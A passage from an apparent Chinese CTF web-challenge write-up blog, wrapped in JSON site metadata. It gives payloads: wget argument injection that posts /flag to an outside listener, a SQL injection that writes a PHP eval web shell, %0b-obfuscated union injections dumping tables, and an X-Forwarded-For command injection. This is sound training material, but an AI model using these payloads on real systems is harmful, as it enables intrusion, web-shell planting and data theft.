1phar://uploads/5a13b7b1b065e675e36187d2b4b69186.png/a.txtaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 38、[陇原战”疫”2021网络安全大赛]CheckIN盲注得admin54a83850073b0f4c6862d5a1d48ea84f但是没啥用payload 1wget?argv=1&amp;argv=--post-file&amp;argv=/flag&amp;argv=http://192.168.237.128:7777/ kali上运行 1nc -lvp 7777 没有vps 再见了 39、[2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th]cybercms发现后台&#x2F;admin&#x2F;login.phpbeescms漏洞payload user POST传参 1adm&#x27;/**/union/**/seselectlect/**/1,2,3,4,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e/**/into/**/outoutfilefile/**/&#x27;/var/www/html/nene.php 之后访问&#x2F;nene.phpPOST 12cmd=system(&#x27;ls /&#x27;);cmd=system(&#x27;cat /flag.txt&#x27;); 40、[NewStarCTF 公开赛赛道]又一个SQL123456#爆表名name=-1%0bunion%0bselect%0b(select%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=database()),2; #爆列名name=-1%0bunion%0bselect%0b(select%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#x27;wfy_comments&#x27;),2;# 爆字段-1%0bunion%0bselect%0b(select%0bgroup_concat(id,text,user,name,display)%0bfrom%0bwfy_comments%0blimit%0b0,1),2; 41、[BJDCTF2020]The mystery of ip找到提示 1&lt;!-- Do you know why i know your ip? --&gt; 发现是请求头存在注入 1X-Forwarded-For:&#123;&#123;system(&#x27;ls /&#x27;)&#125;&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xxxkkk578.github.io/categories/CTF/"}],"tags":[{"name":"CTF,Web","slug":"CTF-Web","permalink":"http://xxxkkk578.github.io/tags/CTF-Web/"}]}],"categories":[{"name":"知识类","slug":"知识类","permalink":"http://xxxkkk578.github.io/categories/%E7%9F%A5%E8%AF%86%E7%B1%BB/"},{"name":"学校相关","slug":"学校相关","permalink":"http://xxxkkk578.github.io/categories/%E5%AD%A6%E6%A0%A1%E7%9B%B8%E5%85%B3/"},{"name":"CTF","slug":"CTF","permalink":"http://xxxkkk578.github.io/categories/CTF/"}],"tags":[{"name":"tips","slug":"tips","permalink":"http://xxxkkk578.github.io/tags/tips/"},{"name":"CTF","slug":"CTF","permalink":"http://xxxkkk578.github.io/tags/CTF/"},{"name":"CTF,Misc","slug":"CTF-Misc","permalink":"http://xxxkkk578.github.io/tags/CTF-Misc/"},{"name":"CTF,Web","slug":"CTF-Web","permalink":"http://xxxkkk578.github.io/tags/CTF-Web/"}]}